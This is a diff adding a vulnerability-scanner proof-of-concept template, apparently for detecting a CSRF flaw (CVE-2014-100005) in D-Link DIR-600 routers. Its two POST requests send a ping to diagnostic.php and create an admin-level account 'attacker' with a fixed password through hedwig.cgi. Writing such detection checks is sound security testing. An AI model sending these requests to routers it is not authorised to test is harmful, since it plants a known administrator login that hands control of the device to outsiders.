@@ -1,0 +1,58 @@
+[info]
+author = "ave"
+description = "检测 D-Link DIR-600 路由器（rev. Bx，固件 < 2.17b02）是否存在跨站请求伪造漏洞。通过向 diagnostic.php 发送伪造的 ping 请求以及向 hedwig.cgi 发送创建管理员账户的请求，验证是否缺少 CSRF 令牌保护。"
+id = "POC-AVE-2014-0111"
+name = "D-Link DIR-600 路由器 CSRF 漏洞 PoC"
+severity = "high"
+tags = ["ave-2014-0111"]
+vuln_id = [
+    "CVE-2014-100005",
+    "AVE-2014-0111",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/diagnostic.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "act=ping&dst=127.0.0.1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "ping",
+    "PING",
+    "alive",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/hedwig.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=set&username=attacker&password=attacker123&level=0"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "OK",
+    "success",
+    "SAVE",
+]
